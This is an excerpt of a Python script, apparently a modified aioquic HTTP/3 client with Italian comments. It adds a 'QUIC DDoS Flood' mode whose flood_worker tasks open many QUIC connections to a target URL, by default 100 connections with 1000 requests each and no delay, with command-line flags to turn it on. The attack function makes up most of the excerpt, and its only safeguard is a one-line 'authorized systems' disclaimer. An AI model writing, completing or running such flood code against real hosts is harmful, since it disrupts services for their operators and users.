...
# --- NUOVA FUNZIONE PER IL FLOOD ---
async def quic_ddos_flood(
    ...
    assert parsed.scheme in (
        "https",
        "wss",
    ), "Only https:// or wss:// URLs are supported for flood mode."
    ...
    logger.info(
        f"Avvio del QUIC DDoS Flood su {target_url} con {num_connections} connessioni e {requests_per_connection} richieste per connessione."
    )

    async def flood_worker():
        nonlocal host, port, configuration, target_url, requests_per_connection, data, local_port
        try:
            async with connect(
                host,
                port,
                ...
                wait_connected=False,  # Non aspettiamo la connessione completa per velocizzare
            ) as client:
                client = cast(HttpClient, client)
                # Tentativo di inviare richieste in modo continuo
                for i in range(requests_per_connection):
                    try:
                        ...
                        logger.debug(f"Richiesta {i+1} inviata con successo da worker")
                    except Exception as e:
                        logger.warning(f"Errore durante l'invio della richiesta: {e}")
                    # Non è necessario un delay in modalità flood, ma puoi aggiungerne uno piccolo se vuoi
                    # await asyncio.sleep(0.001) # Un piccolissimo delay per non saturare la CPU locale
                client.close(error_code=ErrorCode.H3_NO_ERROR)
                logger.info("Connessione chiusa da worker.")
        except Exception as e:
            logger.error(f"Errore durante la connessione del worker: {e}")

    # Creazione e avvio di più task per il flood
    tasks = [asyncio.create_task(flood_worker()) for _ in range(num_connections)]
    await asyncio.gather(*tasks)

    logger.info("QUIC DDoS Flood terminato.")
...
async def main(
    ...
    local_port: int,
    zero_rtt: bool,
    flood_mode: bool,  # Nuovo parametro
    num_connections: int, # Nuovo parametro per flood
    requests_per_connection: int, # Nuovo parametro per flood
) -> None:
    # Se la modalità flood è abilitata, chiamiamo la funzione di flood e terminiamo.
    if flood_mode:
        await quic_ddos_flood(
            configuration=configuration,
            target_url=urls[0],  # Per il flood usiamo solo il primo URL
            num_connections=num_connections,
            requests_per_connection=requests_per_connection,
            data=data,
            local_port=local_port,
        )
        return # Termina dopo il flood

    # Logica esistente per le richieste HTTP/WebSocket normali
...
if __name__ == "__main__":
    ...
    # --- Argomenti per il DDoS Flood ---
    parser.add_argument(
        "--flood-mode",
        action="store_true",
        help="Abilita la modalità QUIC DDoS flood. Usa con cautela e solo su sistemi autorizzati.",
    )
    parser.add_argument(
        "--num-connections",
        type=int,
        default=100,
        help="Numero di connessioni QUIC da stabilire in modalità flood. (default: 100)",
    )
    parser.add_argument(
        "--requests-per-connection",
        type=int,
        default=1000,
        help="Numero di richieste per connessione in modalità flood. (default: 1000)",
    )
    # --- Fine Argomenti per il DDoS Flood ---
    ...
    asyncio.run(
        main(
            ...
            flood_mode=args.flood_mode, # Passa il nuovo parametro
            num_connections=args.num_connections, # Passa il nuovo parametro
            requests_per_connection=args.requests_per_connection, # Passa il nuovo parametro
        )
    )